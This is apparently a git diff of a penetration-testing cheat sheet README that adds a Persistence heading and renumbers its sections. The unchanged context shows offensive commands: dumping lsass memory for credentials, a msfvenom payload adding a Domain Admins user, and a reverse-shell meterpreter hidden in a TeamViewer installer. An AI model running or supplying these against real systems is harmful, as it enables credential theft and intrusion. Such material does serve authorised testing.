@@ -7,16 +7,17 @@ Overview
 3. - [Exploitation](#3---exploitation)
 4. - [Lateral Movement](#4---lateral-movement)
 5. - [Privilege Escalation](#5---privilege-escalation)
-6. - [Brute Force](#6---brute-force)
-7. - [Password Dumping](#7---password-dumping)
-8. - [File Transfers](#8---file-transfers)
-9. - [Restricted Shell Escapes](#9---restricted-shell-escapes)
-10. - [Shells](#10---shells)
-11. - [Evasion](#11---evasion)
-12. - [Online Resources](#12---online-resources)
-13. - [Browser Plugins](#13---browser-plugins)
-14. - [Exploits](#14---exploits)
-15. - [Exploit Research](#15---exploit-research)
+6. - [Persistence](#6---persistence)
+7. - [Brute Force](#6---brute-force)
+8. - [Password Dumping](#7---password-dumping)
+9. - [File Transfers](#8---file-transfers)
+10. - [Restricted Shell Escapes](#9---restricted-shell-escapes)
+11. - [Shells](#10---shells)
+12. - [Evasion](#11---evasion)
+13. - [Online Resources](#12---online-resources)
+14. - [Browser Plugins](#13---browser-plugins)
+15. - [Exploits](#14---exploits)
+16. - [Exploit Research](#15---exploit-research)
    
 #1. - Passive Enumeration
 -----------------------------------------
@@ -2385,7 +2386,10 @@ PS C:\> Get-SQLQuery -Verbose -Instance "<IP address>,1433" -username "<domain>\
 $ raiseChild.py -target-exec <IP address> <domain>/<username>
 ```
 
-#6. - Brute Force
+#6. - Persistence
+-----------------------------------------
+
+#7. - Brute Force
 -----------------------------------------
 
 - Cewl
@@ -2669,7 +2673,7 @@ $ creds search linksys
 https://www.softwaretestinghelp.com/default-router-username-and-password-list/
 ```
 
-#7. - Password Dumping
+#8. - Password Dumping
 -----------------------------------------
 
 - Windows Places to Hunt
@@ -3093,7 +3097,7 @@ https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPA
 C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
-#8. - File Transfers
+#9. - File Transfers
 -----------------------------------------
 
 - Base64 Downloads (Kali -> Windows)
@@ -3605,7 +3609,7 @@ for share in $(smbclient -L $SERVER -U $USER%$PASS 2>/dev/null | awk '/Disk/ {pr
 done
 ```
 
-#9. - Restricted Shell Escapes
+#10. - Restricted Shell Escapes
 -----------------------------------------
 
 - Shell Escapes
@@ -3637,7 +3641,7 @@ $ export TERM=xterm-256color
 $ stty rows 67 columns 318
 ```
 
-#10. - Shells
+#11. - Shells
 -----------------------------------------
 
 - Bind Shells
@@ -3710,7 +3714,7 @@ $ msfvenom -p windows/x64/exec cmd='net group "Domain Admins" james /add /domain
 $ msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<IP Address> LPORT=<Port> -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
 ```
 
-#11. - Evasion
+#12. - Evasion
 -----------------------------------------
 
 - Disable Windows Defender
@@ -3767,7 +3771,7 @@ PS C:\> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properti
 PS C:\> qwinsta
 ```
 
-#12. - Online Resources
+#13. - Online Resources
 -----------------------------------------
 
 - Speedguide
@@ -3794,7 +3798,7 @@ https://lolbas-project.github.io/
 https://gtfobins.github.io/
 ```
 
-#13. - Browser Plugins
+#14. - Browser Plugins
 -----------------------------------------
 
 - Wappalyzer: Website technology analyser
@@ -3815,7 +3819,7 @@ https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
 https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
 ```
 
-#14. - Exploits
+#15. - Exploits
 -----------------------------------------
 
 - Compile Shared Library
@@ -3984,7 +3988,7 @@ https://github.com/Bonfee/CVE-2022-25636
 https://github.com/Liuk3r/CVE-2023-32233
 ```
 
-#15. - Exploit Research
+#16. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
